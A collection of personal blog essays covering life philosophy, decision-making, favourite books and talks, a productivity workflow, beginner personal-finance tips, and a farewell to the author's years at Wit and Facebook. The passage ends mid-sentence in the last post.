![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8xKldab3p4cHZPU3E3bVM3TkFicUxlS3cucG5nP3Jhdz10cnVl)

Most of the time, if you criticize some new idea, you are going to be
right. This is because the majority of new ideas are bad. If they were
good, other people would have done them already.

However, only *within the space* of bad ideas lie great ideas. These are
ideas that were bad before, that now, because of something most people
don't see, have become great ideas.

This is something I keep in mind, when I pick what to work on, or when I
give feedback.

# It's not about what you want

Many people want to be successful in business. Many people want to be
excellent coders. Many people want to have great relationships. When I
look at those that are the best in their craft, it is not their desire
that sets the apart from the crowd. It is their clear understanding of
*what it takes,* and their resolve to *do what it takes.*

Want to be great in business? Prepare to be doubted by many. Want to be
an excellent engineer, prepare to face the limits of your knowledge,
prepare to sound dumb many times over. Want to be great at
relationships, prepare to face rejection.

# On Fairness

In the tech industry, employees often feel slighted by the world,
perceiving an "unfair" environment. They see people who make millions
around them, or negotiated twice their RSUs, and feel that the tech
industry is broken. The feeling is akin to oppression almost, and the
drive moves towards unionization.

To turn things around, maybe the concept of fairness is broken. From
where in nature has fairness ruled? Where has fairness produced optimal
outcomes?

It's hard to make this suggestion. If you feel angry I'm making this
suggestion, take a moment to think about it. Maybe this drive to
fairness is limiting you, maybe it's stopping you from seeing the paths
that ultimately lead you to your goals.

# On The Delivery

One of the tenets of my philosophy is to be unabashedly clear with my
friends. I don't "like my friends for their faults". I like them for
their inner selves, and point out the faults I see.

Sometimes, this can backfire. Instead of helping them, you shut them
down during their moment of vulnerability. It happens when I speak in
absolutes. It comes as a surprise, and does not accomplish anything.

This is a subtle reminder for myself, to remember how important the
delivery is. Keep the other person in mind, empathize, and say it well.

# Allow for the best case

In our universe, the path to victory is the path of pragmatism and
execution. For me, these ideals have held true. When I questioned
assumptions, identified what was important and executed, the outcomes
were positive.

However, the path of mediocrity lies extremely close to this one. The
subtle difference is that in pragmatism and execution, you allow for the
best case. In the path of mediocrity, you move quickly, but only get
things done the amount that is needed to be okay. It's impossible to
achieve best case scenarios this way, and the difference is non linear.

To give some more grounded examples of what I mean:

-   If you talk to a girl you like, ask her out. Not doing that removes
    the best case scenario
-   If you are launching a product, ask build a marketing plan for it
    and execute. Failing to gather feedback, because it's more
    comfortable and it isn't your job removes the best case scenario.
-   If you set up a meeting, but the other person may not show up, go
    anyways.

# On Breaking Trust

Saying no is hard. Especially when someone who is a genuinely good
person, who has gone to bat for you asks you to do something. It gets
worse when in the abstract, what they're asking for is a good use of
time.

In that position, we think that if we say no, we have broken their
trust. However, does not break when you say no, it breaks when you say
*yes half- heartedly.*

We punt to the future, but the moment of truth surely comes. When that
person is depending on us, and we fail to deliver, that is when trust
breaks.

That is when you have let people down, and worst of all, it was directly
caused by your desire to *not* let them down.

# On Vision

For the longest time, I've operated under what I call the *high upside*
*philosophy*. What is the high upside philosophy you ask? It's the
philosophy you use, when you aren't quite sure what you should be doing.

You see, when you're not sure, you have three options:

1.  Sit around and wait for inspiration to hit
2.  Pick something, and go all in until you flame out or win
3.  Just do things that are 100% good for you

All other things being equal, being healthier, wealthier, more skilled
and more cultured will put you in a better position, so why not do that?
This is Option 3.

This is what got me to learn Mandarin after ratcheting down my company
in Taiwan. This what got me getting deeper on finance, health, speaking,
french, and many other things I am happy to have learned over the last
few years.

To better illustrate this, here's the diagram of how I saw the world:

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8xKmJES3V4bDNJR05rM2pqaUdHR3ZQcFEucG5nP3Jhdz10cnVl)

To clarify, by saying I had no vision, I mean I could not *articulate*
any vision. I sort of "trusted" the world and my tastes, in that what I
was doing would come together to form a unique whole, and *reveal* the
vision to me.

This philosophy lasted me a while, but alas, all good things must come
to an end.

I started to falter when I had an abundance of great opportunities. It
gets harder to choose what to work on, since all of them are positive
EV\[1\]. It's also hard to get others involved --- "high upside" does
not get the blood rushing. Worst of all, the hardest, most high upside,
large, creative, projects have "down periods", where things just don't
look good, and you aren't quite sure how to get out.

What if there was a tool you can use, that could let you say "no", let
you recruit the best and brightest, and help you make the decisions
necessary to come back to center?

Ah, that's vision...

I looked throughout my past, and realized that my mentors had this ---
this is why I worked with them.

I realized, that possibly the the world was like this:

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8xKmxfQ1FXQnA1UmJJc1hFZDdhNjQzWmcucG5nP3Jhdz10cnVl)

I was to scared to take the next step, because it's so easy to fall into
the trap of blindness or inaction.

However, this is the tool I saw I needed to grow as a person. I still
haven't figured out what the tactical steps are, but I wanted to share,
in case you have, then email me :)

------------------------------------------------------------------------

\[1\] EV: Expected Value ---
<https://en.wikipedia.org/wiki/Expected_value>

# On a brooding mind

No matter how far we go, days often come, where we start brooding.
Sadness creeps in, and searches for something to get angry about. The
twist to it all is, you aren't winning against anything or anyone by
being angry. It is your day you just spent, and you don't have so many.

# An Open Source Component Repository

Mark Shlick and I are UI engineers. We meet up every week to talk shop,
and riff on ideas. One idea came up, that could make UI engineers more
productive, and increase how much work is reused.

Neither of us have bandwidth to work on it, so we wanted to share it
with you. If this excites you, please build it --- it would definitely
earn you some love from us, and maybe more from the community.

**The Idea**

React Components reshaped our job as UI Engineers. JSX and the idea of
having UI be a pure function of props made it simple to share and re-use
components in our apps.

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKnB3eVNKZ1Y4ckdxT0libDIuP3Jhdz10cnVl)

This allowed us to reduce how complex our codebase grew. We even built
[internal component
repositories](https://github.com/storybooks/react-%20storybook), to
showcase and discover components teammates could reuse.

Now, we re-use react components internally, but could we take it a step
further? **Could we share components as a community?**

We already have great open source components, from date pickers to phone
number inputs. To demonstrate these components though, the authors have
to go to great lengths to help you find and try them out.

What if there was a visual explorer for all open source components

**Users could discover components visually**

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKnZpVzJFZ2hIamZLalI5S28uP3Jhdz10cnVl)

**Developers could quickly demonstrate their components, from propTypes,
to the different states they take up.**

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKk53ZkJTV0ZkVmtVblo0cnYuP3Jhdz10cnVl)

Developers could do this by adding some sort of dotfile in their repo.

**Users could play with these components, a la codepen**

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKlBJZno3T1dNbmZHajF2d2guP3Jhdz10cnVl)

**The Opportunity**

If this works out, the number of components that are open sourced would
increase, the number of people who discover these components would
increase, and developer productivity would increase. One natural
conclusion here would be to also allow developers to *sell* components
too.

**The Problem**

Now, there are some hard questions to answer to make the opportunity pan
out. First, it's still not easy to style and customize components. Most
UI Engineers will want to do this heavily. Creating some standard here
could go a long way. Monetarily, even though this could save engineering
time, we're not sure the pain point is high enough for many people to
pay.

**If you're still excited, give it a shot!**

Well, that covers the idea! If you think this could be cool to, and you
have some bandwidth, try to take it on.

# Not alone

As humans, we draw distinctions between things. Living things and dead
things. Animals and humans. Humans and friends. Friends and family, and
finally, family and ourselves.

We draw these distinctions, based on a belief of ourselves as an
individual, acting *onto* the world. We are somehow different from the
world, forcing our will onto it.

This can help you strive and, for the lack of a better word, conquer.
However, who is less alone then someone like this?

Instead, what if we were all a part of our whole? How can you conquer or
go against something, that you are also a part of? This is the Paulo
Coehlo vision, but I definitely felt it recently --- instead of things
being a battle, it's actually every single thing, evolving and nurturing
"the soul of the world" :P

# About the craft

When we are in the process of honing our craft, the pursuit quickly
becomes "about the craft". This is an excellent way to grow, but I
realized, I grew the most, when I wasn't focused on the craft itself. I
was more focused on the people. I wanted to "take care" of my "patrons".
This desire infused the energy, and the fun that was required to make
large strides in my craft

# A 2 hour foray into small business

I had an idea recently, to procure large living spaces and sublet them
in San Francisco. This is certainly something I would have loved as a
tenant the first time I arrived.

Here's what I expected would happen next:

After a few days of research, I would have a vague path for version 0.
Path in hand, I would then talk to potential customers, refine an MVP,
and start iterating.

A few hours in, I saw how complicated the housing laws were for San
Francisco. Each path had it's own "shady" side. It seemed like any
action I could take could be wrong, and exposed me to unnecessary risk.

With this, I felt how viscerally negative this kind of bureaucracy is to
our productivity as a community. After a certain level of red tape, it's
just not worth investing time and money into something.

I had thought that a small business would have been a reasonable path
for doing good and building an income stream, but counterintuitively,
building something in tech could still be better. There's many things
going for tech, but one of the most immense differences lie in
regulation.

# On Alternatives

When making a tough decision, it is easy to become myopic:

-   Either you invest in index funds or you put all your money in
    savings
-   Either you quit your job or you don't
-   Either you go out to meet girls at clubs or you don't do anything
-   Either you workout 3x / week or you do nothing

At these points, it can pay dividends to consciously expand your scope

-   Are there any other options you're not seeing?
-   What have people in your position done before?
-   What do your mentors and friends think you should do?
-   What if you couldn't do what you were thinking, what else could you
    do?

When you have only one option, it makes a lot of sense to convince
yourself it's amazing. However, if you widen the road you can take, you
can see much more alternatives, with a much higher degree of variance.

# Bottom-Up Goal Setting

When deciding what to do next, it's common practice, to start top down.
You sit down and ask "Why am I alive?", and from there working out what
you should do next week.

This is worth doing, but I have found that *what you are doing now* is a
much better starting point for answering these questions.

It's the "walking the walk" of your priorities. If you group your time,
and sort, you will see your priorities.

In that process, you will also see where the current priorities do not
match up to what you want, and there lies what to do next.

# Process

To sit down and think What you want to achieve Remember when This very
moment was a dream But do you remember, from where even that moment
came?

--- ---

Like inside and outside, achievement and process are linked. But process
is alive, and achievement is dead. The gift is the process.

# Cognitions

David Burn's "Feeling Good" has been one of the most impactful books
I've read this year.

The key piece is that certain patterns in your thinking lead you to
misperceive reality and lead you into depression. These *rang* for me.
Seeing reality more clearly can do wonders for a blue mood, but it can
also do wonders for almost any goal you're aiming for.

<https://www.pacwrc.pitt.edu/curriculum/313_MngngImpctTrmtcStrssChldWlfrPrfssnl/hndts/HO15_ThnkngAbtThnkng.pdf>

# Advice on starting out as an engineer

A friend of mine recently started their first job as a software engineer
and asked me for some advice on getting started well *.* I thought about
it --- and think I'll share here too :)

Three tenants:

A. Always work upstream

-   When you work on hard problems, you learn more, they are often fun,
    and as a result you get them done well. When this happens, you get
    even harder problems, and the virtuous cycle continues on. Now,
    imagine the opposite --- you work on less hard problems, do them
    badly as they are unrewarding, and get even less fun problems.
    Always aim to do an excellent job and take on what the hardest
    problems are --- do not shy away from them

B. Think beyond the job description, think as an owner and a craftsman

-   You can be a normal software engineer, you can be someone who: A.
    cares about their customers, is not afraid to wear the PM / designer
    / CEO hat when needed. However, as a software engineer, you also
    take pride in doing things well --- this means pragmatism ---
    getting things done, combined with constant improvement of both the
    codebase and the product

C. Surround yourself with the best --- go where the knowledge is

-   You only know what is possible based on who you talk too. Make sure
    you admire your co-workers, and the people you work with. If you
    need to learn something, go where the source is

-   One way to surround yourself with great people is also through the
    web --- i.e reading <https://www.joelonsoftware.com/> --- hit the
    new developer and rock-star developer sections, and read top!

\`

# My favorite books

Yesterday at lunch, our teams interns and me started talking books, and
the hour flew by. At the end a task was opened up to share some
favorites. Here it goes 😊

\*\* *Books that have influenced my thinking the most*\*\*

-   Antifragile by Nassim Taleb --- *goes over the idea that in certain
    domains, the extremes are what matter, I base a lot of my life on
    the philosphy that stems from that*

-   Principles by Ray Dalio --- *Dalio's rules for operating at life and
    business. I loved his idea of "the machine" of achieving your goals,
    and how many interactions can be generalized as "another one of
    those". Aside from his concepts, I stole his idea of a Principles
    list, which I keep, and a Situations List.*

-   The Red Queen by Matt Ridley --- *fascinating book, about the
    constant race that occurs within species through sexual selection.*

-   Stoic authors: Seneca, Marcus Aurelius, A Guide to the Good Life ---
    *From these authors I gained the idea of focusing on what we can
    control. I also love how these philosophers were doers, their
    philosophy is rooted in reality. A great essay to start with is "On
    the shortness of life" by Seneca*

-   Models by Mark Manson --- *Philosophy book disguised as dating
    advice. I gave this to my sister I liked it so much! The main idea
    is to be vulnerable and real in relationships*

-   Getting Things Done by David Allen --- *David spent all his life
    perfecting the way to manage your life and work --- his ideas have
    influenced pretty drastically how I operate on a day-to-day basis*

-   Feeling Good by David Burns --- *If you find yourself having a lot
    of ups and downs in mood, this book helps greatly. His ideas for the
    way which we misperceive reality was an eye opener for me.*

-   Essays by Paul Graham --- *I think PG's thoughts are going to last
    the test of time. Many ideas on building wealth, friendships,
    hacking, and painting are keystones to my philosophy. I even made[a
    book](https://github.com/stopachka/pg-essays/tree/master/book) from
    it once to make things easy*

\*\* *Fiction I have re-read over and over again*\*\*

-   Taiko by Eiji Yoshikawa --- *This goes over the story of Toyotomi
    Hideyoshi, it's a tale of historical fiction I found so rivetting,
    and had me researching a lot of Japanese history : \>*

-   The Count of Monte Cristo by Dumas --- *I've read this book multiple
    times, with the first time being when I was about 13. Each time, I
    see a different side of this story. It's an 18th century tale of
    badassery, where the protagonist just kicks bum*

-   The Works of Rafael Sabatini --- In a span of 5 months I read 30 of
    his books. They're all simple plots, but nourish the adventurer, and
    the hero within you. I'd recommend you start with Captain Blood,
    then Scaramouche

-   The Alchemist by Paolo Coelho --- *The idea that we are all one, and
    a part of the "soul of the world", is something I've grown to
    internalize*

-   The Prophet by Khalil Gibran --- *This is the only poem-book I have
    found to like. Such beautiful verse, it's a pleasure to re-read*

\*\* *Some fun books*\*\*

-   Chimpanzee Politics --- *This book got me diving deep into a bunch
    more books on chimps. Rivetting story about a tribe that was being
    studied. Many applications to human behavior.*

-   The other side of the leash --- *A book on dogs and how they think.
    Called my parents afterwards and asked them to get a dog*

-   Total Recall by Arnold --- *Arnold has so much raw ambition and
    belief in himself, it's pretty astounding. Have read many of his
    books, and found them invigorating*

*Leaving the best for last....*

The Life Changing Magic of Tidying up by Mario Kondo :). Will turn many
slobs into masters of cleaning

------------------------------------------------------------------------

Oky doke, those are the main recommendations that come to mind. I wrote
from memory to make sure these were *really the books I liked, and not
the ones I wanted people to think I liked :). This is a snapshot of my
mind in August 2018*

------------------------------------------------------------------------

*Update 2020*

About 2 years have past. I would add 2 books and a series to this list:

-   Hazlitt\'s Economics in one Lesson & Hayek\'s Road to Serfdom. The
    ideas in these books show with clarity and precision just how much
    our world is ruled by higher order effects. In the macro, intentions
    and our first assumptions lead us astray. These books catalyzed a
    journey of reflection and reading for me. At the end of it, I formed
    a more nuanced world view, which respects what we can\'t understand.
    It needs to be the right time. If you are deeply wondering just how
    the world works, these are the books to start out with.
-   The Wooster series by P.G Wodehouse. His writing is a joy to
    experience. You can\'t help but laugh through the chapters, and he
    makes it all seem effortless.

------------------------------------------------------------------------

Finally, a call to action: *any book recommendations for me? :)*

# Favorite Rich Hickey Talks

Within our team some of Rich Hickey's idioms and thoughts have become a
superpower and a secret language. Rich's thinking on system design and
problem solving is profound. I think the lessons there can transfer to
other facets of life too. For posterity, sharing some favorites:

**On thinking through tough problems**

[Hammock Driven
Development](https://www.youtube.com/watch?v=f84n5oFoZBc)

**On avoiding dogma and writing truly simple programs**

[Simple made Easy](https://www.infoq.com/presentations/Simple-Made-Easy)

**Some favorite talks, just on programming**

Comparing programming language design with system design

[Language of the System](https://www.youtube.com/watch?v=ROor6_NGIWU)

Thinking about the most robust way to build for concurrency

[core.async](https://www.infoq.com/presentations/clojure-core-async)

*(there's too much on just programming, so will rewatch them at some
point, and update with what I really loved)*

Have other favs, or other talks? Share them with me please! :)

# When it's time to leave

Often, I reflect on where our mission is at, and my personal goals. This
can lead to asking the inevitable question: *is it time to move on?*

Well, I reflected on this recently, and in the end, came up with a
decision set I go through --- what matters and what doesn't. Here it is
:)

### First and foremost, what **does not** affect the decision

**The Money** --- *Ethics and relationships trump Money*

-   What is the point of money, if you sell your ethics for it? Over the
    long term, this will burn your self confidence and your
    relationships. By ethics, I mean, if you end up "resting and
    vesting", becoming a negative influence on your team and culture.

**The Inconvenient Things** --- *Little things should never affect big
decisions*

-   The "I have rent to handle", a "personal trainer to pay for" kind of
    stuff. Sure, it may be inconvenient, but these kinds of things have
    a way of working themselves out. Besides, there's inconsequential
    when it comes to the larger problem.

**What the Future Holds** --- *Ambiguity is good, you will figure it
out*

-   The question, well "what else would I do?". This almost makes one
    feel stupid, as it seems weird to give the financial side up,
    without any competitive thing to do. But, this kind of thinking can
    get you stuck forever. Know you *will* figure out what to do, and
    quite quickly at that, and this will have to happen at some point.

**Fear completing your large projects** --- *Large, ambiguous, hard
projects are where true learning comes from*

-   Sometimes, you may feel stuck with a large project, the desire to
    leave is caused by some sort of blame avoidance. Remember you can't
    fool yourself, if the project fails *after* you leave, that's even
    worse. The best course of action is to share where you're at.

### Now, what **does** affect my decision

**Honor and Ethics ---** *What is the best for my team?*

-   All in all, I want to do what is best for the team. Is staying, at
    the level of contribution you think you can make, good or bad for
    the team?

**The Difficulty ---** *In reality, what is the harder, more learning
filled path?*

-   In life, the long roads are often shorter, and what seems daunting
    is often the most personally rewarding. Learn to love these dangers
    and difficulties. When you ask yourself *What is more difficult* ---
    what's the natural answer for you? starting the adventure now, or
    pushing through?

# How I work

Over the years, I have built up a slew of tools, that help me stay on
top of what I am working on now, and the direction I am heading in over
the long term. Much of this is inspired by Getting Things Done by David
Allen, and numerous, long conversations with friends that are into this.
I was always curious about others' workflows, so I thought I'd share
mine too. Without further ado, here's how I work:

**The Inbox: Every thought flows into Things3**

If someone mentions a book, I am in conversation with a friend, and we
come up with an idea, or I am in a meeting and need to remember
something, it all flows into Things3.

**The Personal: All personal projects are managed on Things3**

Every few days, I make sure the Inbox is processed. For personal things,
this often means these turn into action items and projects on Things3.
Here's how it looks right now:

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8xKjVKZTNzQTBwWGZ4UFM5S3VwWml3LXcucG5nP3Jhdz10cnVl)

Oranged out some more personal projects. I took a lot of pride in
selecting these area titles :}

I try to keep most projects under some sort of theme, which resembles,
but does not often 1:1 correlated with the "responsibilities and
spheres" in my life.

In each project, tasks are often assigned one tag. I use these tags:

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8xKmFheU10aVgwVkRuUjVnOFRDLVZKc2cucG5nP3Jhdz10cnVl)

"snack" means quick and easy

**The Timely: All action items that need to be done at certain time goes
to Fantastical**

If an action item needs to be done at a certain time, it goes on the
calendar. I used to add duplicates to these Things, but as I am pretty
religious about the calendar, and in the end decided there was no need
for this. I can often correlate these action items back to projects
during a weekly review.

**The Professional: I use a Paper doc to manage my professional work.**

I found that my work fits into linear, long time blocks, that require a
lot of rampup (engineering work). I found the GTD flow doesn't work too
well for this, because it makes it harder to stay focused and ramp up
quickly on a long cycle of work. I moved to using Paper doc, with the
goal of making it as easy as possible to jump in and start coding.
Here's how that looks:

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8xKnhEOC1BME14djY4Rzd5QzBmZFV6VmcucG5nP3Jhdz10cnVl)

Had to orange out most of that :p

I have a scratchpad, which makes it easy to ramp back up on the main
project. At any given point, I know that the highest priority is deep
work, so if I can do I just look at that and pick the next task.
Otherwise, if I am blocked I can focus on Make or Manage.

**The Weekly: I review the system by a Paper template every week**

At the end of every week, I go over the tools above, to make sure
projects are on track and running smoothly. Here's how that template
looks:

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8xKktzallVZXphcFdlcWNqMWRweGR4TlEucG5nP3Jhdz10cnVl)

**The Mid Term: I track my areas and year-level goals in one small
document.**

The majority of my time is oriented at the ground level. However, it's
replenished and energized every few months, from a quick document I
maintain called Mid-Term. here's how that looks:

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8xKlpkdldVSENGZ3RDdkhhVC1aamhzbmcucG5nP3Jhdz10cnVl)

The Mid-Term quickly lists the open loops and sphere in life, and
year-level goals in area

**The Long Term: The long term goals are inspired by an essay**

Once every few years, I end up using a long plane ride to write an essay
about how life will look 5 years from now. I refine it little by little
as time goes on, and it serves as a constant source of inspiration.

**The Principles: As life goes on, I update a Principles list**

The final in my system document called Principles. As time goes on, I
jot down the lessons learned, big or small, on this list. it can go from
"Don't take 30 minute layovers" to the criteria you should use to decide
what to work on.

Well, this is pretty much it! If you have systems or thoughts, please
share them with me :)

# How to stack the doe when you're an intern

When I was younger. this was taboo. You pretended to be great at it,
while not knowing very much. Yes... I am talking about personal finance.

Here's what I wish I knew when I started off:

**Personal finance is NOT about restrictions, it's about living the life
you dreamed of.** The world tells you to sacrifice and live on ramen to
do it *right.* Not true. You don't have to penny pinch and save 50 cents
on coffee. **Wins come from making a few large decisions well.**

So, you just finished your internship. What should you do with your
new-found intern riches?

1.  Open an account at schwab, this is the best checking account. You
    will never have to pay for ATM fees on your many backpacking
    journeys. Put a chunk of cash from your riches here, and feel free
    to use it on whatever you want. You worked hard, treat yourself.
2.  Open an account on Betterment. Create 3 sub accounts. Emergency,
    Travel, {some-other-fun-thing-or-goal-here}. This will be your base.
    Distribute a sizable chunk of your riches in each of these three
    accounts.
3.  For each of those savings accounts, set up an automatic transfer.
    You can start with 10 dollars. The goal is to go through the
    process, and start automating your finances.

Now, once you save up about \~6 months worth of runway. Ping me for more
information!

---

**FAQ**

**Q: *I will make so much money when I start working, why do I need to
focus on this now?***

You will feel preeetty great with an emergency fund and a travel fund.
These skills will transfer.

**Q: F *ocusing on my profession is higher leverage then personal
finance.***

You're right...sort of. These are *three* steps, and they're easy to do.
When you have an emergency fund, you will take more fun risks in your
career. When you have a travel fund, you will have a lot of
fun...traveling. Plus, when you end up going to YC (hopefully you ping
me to invest :\>) and IPO your startup, you'll have the infrastructure
in place to move that doe.

\*\* *Q: That's it...3 things? What about Benjamin Graham and tax-loss
harvesting?*\*\*

When you do those 3 things, and they work out, you'll have a lot more
natural motivation to learn. Anything more is useless right now. Plus
you're right, that focusing on your friendships, work ethic, and
adventure is higher leverage. I am obligated to say though, that I stole
the roots of my personal finance philosophy from Ramit Sethi's *I will
teach you to be rich.* If you have the extra time it's a good book to
give a read. In the middle of your YC- application, or your Facebook
takeover, I can give you more ideas though!

\*\* *Q: Stack the doe?*\*\*

Tryin to be cool here, it's like the word *bet,* but for personal
finance

# The positive side

The world is complex beyond anyone's understanding, and that is
beautiful.

On the macro scale,

It's possible to see that a fragmented world, led by vested interests,
is heading towards impending doom.

Or it's possible to see the world is in a state where people are more
empowered, and have more leverage than ever before. It's possible to see
a strong, unifying and unyielding strength in humanity --- that this
power and leverage, available to so many, is also used by good people
who solve problems to further enrich the lives of those ahead of us.

On the micro,

It's possible to think you're trapped, surrounded by people optimizing
for the wrong thing, with only pointless work and pointless
relationships ahead.

Or it's possible to see the numerous beautiful, small gestures, the deep
worlds every person has within them, the tapestry of experience we all
build.

Neither are completely right, but a bend on either side can makes all
the difference to how you feel, what you can do, and what actually
happens.

# Favorite Rich Hickey Talks

Within our team some of Rich Hickey's idioms and thoughts have become a
superpower and a secret language. Rich's thinking on system design and
problem solving is profound. I think the lessons there can transfer to
other facets of life too. For posterity, sharing some favorites:

On thinking through tough problems

[Hammock Driven
Development](https://www.youtube.com/watch?v=f84n5oFoZBc)

On avoiding dogma and writing truly simple programs

[Simple Made Easy](https://www.infoq.com/presentations/Simple-Made-Easy)

Some favorite talks, just on programming

Comparing programming language design with system design

[Language of the System](https://www.youtube.com/watch?v=ROor6_NGIWU)

Thinking about the most robust way to build for concurrency

[core.async](https://www.infoq.com/presentations/clojure-core-async)

*(there's too much on just programming, so will rewatch them at some
point, and maybe update with what I really loved)*

Have other favs, or other talks? Share them with me please!

# Principled Decision Making

When you are deciding something difficult, how do you do it?

There are some common frames you can look at --- results-based,
financial- outcomes-based, social-outcomes-based, self-reward-based,
macro-based, micro- based.

By default, a mix of these forces come together to influence your
decision. The problem? *These forces suck.*

Decisions based on these frames often lead to short-sighted outcomes,
and endanger what matters most in life.

So, what can we do? I think all religions, all stoics, all grandmas,
point to a form of decision making that guarantees you won't endanger
what matters most.

\*\* *That, my friends, is principle-based decision making.*\*\*

What is it, and how does it work?

When you come across a problem, you ask yourself ---

*a) What has happened*

*b) What principles do I hold, which apply to this situation?*

*c) Given those principles, what actions can I take?*

*d) What is the best decision, and why?*

*e) Act*

There's multiple beautiful things about this process

1.  *You can put your thinking into writing, and share with your peers.*
    They should see that based on your principles, that is the choice
    that makes sense. They can then challenge your principles or show
    you a different path.

2.  *You end up building a runbook of tough situations, that you can use
    over and over again.* How should you treat a friend that let you
    down, how do you decide to leave your job? How do you decide whether
    you go on that vacation with your family? Principles, time and time
    again, will be your weapon to make the choices that will stand the
    test of time

If you like this way of thinking, here are some ideas for next steps ---

1.  Read *Dalio's Principles.* My ideas here initially stemmed from
    reading his PDF when I was 17 years old, and I have "nabbed" some
    principles from him myself

2.  Start a list of your own, and when you have an idea about how to
    live life, no matter how small or how big, start writing it down.
    From these scratches a castle will form.

---

Now, for some skin in the game --- What do these principles look like?
It's unedited and rough, but it has come useful time and time again.
[This is a timestamped (as of Dec 23, 2018) view into the principles I
hold related to friendships, work, and
growth.](https://paper.dropbox.com/doc/Principles-%20Dec-23-2018--AUfxcQZ34yOXZg9ehkmlokJYAg-Vdo27jZ4X4nLBXprrV59Q)
I'm sure this will change and evolve, but I hope you find some ideas in
there that you like. If you have a list, would love to see it!

# Thank you Wit, Thank you Facebook

It all began with an email. I saw a small startup with an esoteric
domain name, and even more esoteric technology. They wanted someone who
knew Clojure, Rust, ML, React (before it was cool). I knew Ruby and
Javascript from hacking on my own projects. But hey, we gotta go for
what we want 🙂

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKm5wNURPR2xhNEhaMVdndi0ucG5nP3Jhdz10cnVl)

From that email, I discovered a rag-tag group of people, out of which 3
of us were learning Mandarin, and all of us were new to the U.S. We were
weird in the same way, and that was energizing.

In the interview we worked together and grabbed drinks afterwards. I was
slightly under 21 at the time, but thankfully because the U.S. has their
date format MM/DD/YY, my Canadian passport of DD/MM/YY got me through.

The day I met them, I knew this was the place for me. The CEO Alex and
COO Laurent were friends for over a decade, and leaders where I would
learn from *every* conversation. The CTO Willy was one of the most
talented engineers I had met. The first engineer Oliv took care of me
like a brother. Martin was the most fearless engineer I had ever met,
and one of the most caring friends. Julien became a partner, as we grew
together in *every way*. We were joined by some of the most talented
people I've ever gotten to work with: Anthony, Alexander, Jen, Aric.

## The Fateful Email

Soon after, we got an email from Facebook. Now, we weren't looking, but
when David Marcus and Zuck send an email, you take the time to answer. 2
months, and a few amazing lawyers later, we made it to Facebook

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKjE5RWcycUhFRl9zM2tqc2MucG5nP3Jhdz10cnVl)

Is this the end or the beginning? Definitely the beginning

## The Journey Begins

When we came in, we got bit by the Facebook bug. Everyone was optimistic
and went for world-changing results. Even a mission like "create an
Assistant that can answer any question" was plausible.

So, we tried 🙂. We iterated and iterated, and the team expanded. We
stole Daniel away from an enticing offer from Google. Not sure how much
he knows, but I felt like we hit the jackpot when Spencer joined us.
Kemal came to change the game, Prince, Jing, Loredana, Henry, Sean,
Brian, Cody transformed us into two dream-teams.

This could only have happened at Facebook. David, Raymond I'm humbled by
your belief in us and in your leadership of Messenger.

Our teams built M, which soon turned into M Suggestions, now servicing
millions and millions of users every day. We took Wit forward and built
it into a tool that's used by over one hundred and eighty thousand
engineers.

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKjZrM1M1Ri1OZHlhMXotZWsucG5nP3Jhdz10cnVl)

Days before F8, there was some seerious work to do. Champagne helps

As we grew, Messenger grew with us, and we became a whole family. Yoram
became our director, one of the best mentors a I could have asked for.
Nick, Helen, Rajesh, and Weihu became my managers, and some of the best
coaches I could have asked for.

The core team expanded too. We nabbed Aleka, and she brought care and
true ownership to the entire Wit experience. Jason joined and infused a
fearless spirit into the team. Marion helped give Wit a real voice.

Alongside Wit, the M team grew. Anthony & Yarik were phenomenal
technical leaders, Yi Tong, Christopher, Mo Mo joined

Plus, we had some of the *best interns*. Tony and Pasha are blazing away
at Facebook as we speak, and many are on their way.

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKkxlM2xzbTFfVGVJOGhidzYucG5nP3Jhdz10cnVl)

A full on family was formed

## The Journey comes to a close

After 5 years, and my entire 20s, I began to think about the next
